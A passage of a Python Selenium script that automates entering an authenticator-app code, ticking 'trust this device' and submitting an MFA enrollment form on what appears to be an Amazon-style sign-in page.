            #<input type="text" maxlength="6" required="" id="ch-auth-app-code-input"
            try:
                el_app_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@id = 'ch-auth-app-code-input']")))
            except Exception as ex:
                raise Exception("el_app_code")

            try:
                el_btn_submit = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@id = 'ch-auth-app-submit']")))
            except Exception as ex:
                raise Exception("el_btn_submit")

            self.print(f"Enter code {otp_code} to el_app_code")
            self.driver.execute_script(f"arguments[0].setAttribute('value','{otp_code}')", el_app_code)
            time.sleep(1)
            self.print("el_btn_submit.click()")
            el_btn_submit.click()


            if "Almost done" in self.driver.page_source:
                #<input type="checkbox" name="trustThisDevice" value="1">
                try:
                    el_name_trustThisDevice = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'trustThisDevice']")))
                except Exception as ex:
                    raise Exception("el_name_trustThisDevice")

                self.print("el_name_trustThisDevice.click()")
                el_name_trustThisDevice.click()
                time.sleep(1)

                try:
                    el_end_submit = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@id = 'enable-mfa-form-submit']")))
                except Exception as ex:
                    raise Exception("el_end_submit")

                self.print("el_end_submit.click()")
                el_end_submit.click()
                time.sleep(3)
                #<input id="enable-mfa-form-submit" class="a-button-input" type="submit" aria-labelledby="a-autoid-0-announce">
                pass
            self.print("GOOD END WORK")
        except Exception as ex:
            self.print(ex)
            # self.print(self.driver.page_source)
            self.quit()
            return